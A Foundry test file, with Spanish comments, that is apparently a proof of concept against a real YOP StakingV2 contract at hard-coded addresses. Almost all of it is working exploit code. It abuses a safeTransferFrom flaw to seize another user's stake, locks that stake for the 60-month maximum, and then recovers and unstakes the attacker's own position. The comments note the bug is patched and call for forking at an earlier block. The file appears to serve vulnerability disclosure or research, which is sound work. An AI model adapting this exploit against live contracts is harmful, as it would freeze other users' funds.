// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "forge-std/Test.sol";
import "StakingV2/StakingV2/contracts/staking/StakingV2.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ContractTest is Test {
    using stdStorage for StdStorage;

    IERC20 yopToken = IERC20(0xAE1eaAE3F627AAca434127644371b67B18444051);
    StakingV2 staking = StakingV2(0x5B705d7c6362A73fD56D5bCedF09f4E40C2d3670);
    address attacker1 = address(1);
    uint8 MAX_STAKE_DURATION_MONTHS = 60;
    uint256 public constant SECONDS_PER_MONTH = 2629743; // 1 month/30.44 days

    function setUp() public {
        deal(address(yopToken), attacker1, 500 ether);
    }

    function testYopMaliciousLocking() public {
        //Hacerse pasar por atacante1 para llamadas posteriores hacia los contratos
        startHoax(attacker1);
        uint8 lock_duration_months = 1;
        uint realStakeId = 127;
        uint additionalAmount = 0;

        //Crear una posicion de Staking
        yopToken.approve(address(staking), 500 ether);
        uint attackerStakeId = staking.stake(500 ether, 1);
        staking.safeTransferFrom(attacker1, attacker1, realStakeId, additionalAmount, '');

        //El stake con el id 127 se bloque por 3 meses
        uint8 lockTimeRealStakeId = 3;
        
        //Bloqueamos el stake por la maxima duracion
        staking.extendStake(
            realStakeId,
            MAX_STAKE_DURATION_MONTHS-lockTimeRealStakeId,
            0,
            new address[](0)
        );

        //El atacante ya no tiene control sobre su stake inicial.
        //Pero puede usar la misma vulnerabilidad para transferirla de vuelta a sí mismo. Lo hermoso es que el atacante puede recuperar el control de su staking
        staking.safeTransferFrom(attacker1, attacker1, attackerStakeId, additionalAmount, '');

        //Truco para el tiempo transcurrido, en segundos
        skip(lock_duration_months*SECONDS_PER_MONTH+1);
        staking.unstakeSingle(attackerStakeId, attacker1);
    }

    //Como la vulnerabilidad ha sido reparada, hay que asegurarse de bifurcar en el número de bloque especificado en el Readme, aplicandolo solo a este test
}